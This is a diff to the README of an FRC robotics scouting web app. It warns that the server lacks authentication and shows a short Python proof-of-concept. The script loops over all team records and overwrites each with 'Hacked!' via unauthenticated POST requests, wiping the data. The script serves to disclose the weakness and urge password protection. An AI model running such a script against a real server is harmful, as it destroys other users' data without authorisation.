@@ -1,7 +1,7 @@
 # FRCScoutingWebApp
-Server ready scouting app. I'd recommend you password protect the domain (It's pretty easy to wipe out all server data by modifying scripts).
+Server ready scouting app. I'd recommend you password protect the domain (It's pretty easy to wipe out all server data by modifying scripts or by creating a program ping the server).
 
-Incase you wanted to know how to wipe the database. I'd suggest you password protect because a simple script like this will wipe it all out.
+I made this simple script in a few minutes; it will wipe out all the information in the team files (and replace it with "Hacked!" because we gotta have some fun). 
 
 ```python
 import requests
@@ -21,5 +21,5 @@ data = json.loads(text)
 
 for i in data:
     requests.post(url2+str(i["Number"]), data={'data':'Hacked!'})
-
 ```
+It's unlikely anyone would want to destroy anything, but as proof of concept it shows it's not secure. A security patch will be put out in the future with the server side verifying that a change request is valid.
